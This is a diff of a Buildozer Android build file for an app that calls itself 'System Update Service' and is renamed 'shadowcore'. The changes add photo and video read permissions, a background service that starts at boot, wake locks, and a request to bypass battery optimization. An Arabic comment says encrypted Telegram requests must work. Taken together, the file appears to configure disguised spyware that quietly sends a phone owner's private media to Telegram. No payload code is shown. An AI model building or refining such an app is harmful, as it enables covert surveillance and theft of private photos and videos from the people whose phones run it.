@@ -1,46 +1,38 @@
 [app]
-
 # (str) Title of your application
 title = System Update Service
 
 # (str) Package name
-package.name = system_update_service
+package.name = shadowcore
 
 # (str) Package domain (needed for android packaging)
-package.domain = org.shadowcore
+package.domain = org.test
 
-# (str) Source code where the main.py is located
+# (str) Source code where the main.py lives
 source.dir = .
 
 # (list) Source files to include (let empty to include all the files)
 source.include_exts = py,png,jpg,kv,atlas
 
 # (str) Application versioning (method 1)
-version = 1.68
+version = 1.80
 
 # (list) Application requirements
-# IMPORTANT: certifi and idna are added for secure SSL connection
-requirements = python3,kivy,requests,certifi,idna,openssl,urllib3
+# أضفنا certifi و idna لضمان عمل طلبات تليجرام المشفرة
+requirements = python3,kivy,requests,urllib3,certifi,idna,chardet,jnius
 
 # (str) Supported orientations
 orientation = portrait
 
-# (bool) Indicate if the application should be fullscreen or not
-fullscreen = 0
-
 # (list) Permissions
-# UPDATED for Android 13+ (Images and Video)
-android.permissions = INTERNET, READ_MEDIA_IMAGES, READ_MEDIA_VIDEO, FOREGROUND_SERVICE
+# الأذونات المطلوبة للصور، الخدمة، وتجاوز حماية البطارية
+android.permissions = INTERNET, READ_MEDIA_IMAGES, READ_MEDIA_VIDEO, FOREGROUND_SERVICE, WAKE_LOCK, REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, RECEIVE_BOOT_COMPLETED, POST_NOTIFICATIONS
 
 # (int) Target Android API, should be as high as possible.
-# API 34 is for Android 14
 android.api = 34
 
 # (int) Minimum API your APK will support.
 android.minapi = 21
-
-# (int) Android SDK version to use
-android.sdk = 34
 
 # (str) Android NDK version to use
 android.ndk = 25b
@@ -48,22 +40,22 @@ android.ndk = 25b
 # (bool) Use --private data storage (True) or --dir public storage (False)
 android.private_storage = True
 
-# (list) Architecture to build for (keep only arm64-v8a for speed or add armeabi-v7a)
+# (list) Services to run in background
+# هذا هو السطر السحري الذي يربط ملف service.py بالعملية
+services = myservice:service.py
+
+# (list) The Android archs to build for, choices: armeabi-v7a, arm64-v8a, x86, x86_64
 android.archs = arm64-v8a
 
-# (bool) Allow backup
-android.allow_backup = True
+# (bool) allows cookie to remain active
+android.copy_libs = 1
 
-# (str) The format used to package the app for release mode (aab or apk)
-android.release_artifact = apk
-
-# (str) The format used to package the app for debug mode (apk or aab)
-android.debug_artifact = apk
+# (list) List of Java files to add to the android project
+# android.add_src = 
 
 [buildozer]
-
-# (int) Log level (0 = error only, 1 = info, 2 = debug (with command output))
+# (int) log level (0 = error only, 1 = info, 2 = debug (with command output))
 log_level = 2
 
-# (int) Display warning if buildozer is run as root (0 = off, 1 = on)
+# (int) display warning if buildozer is run as root (0 = off, 1 = on)
 warn_on_root = 1
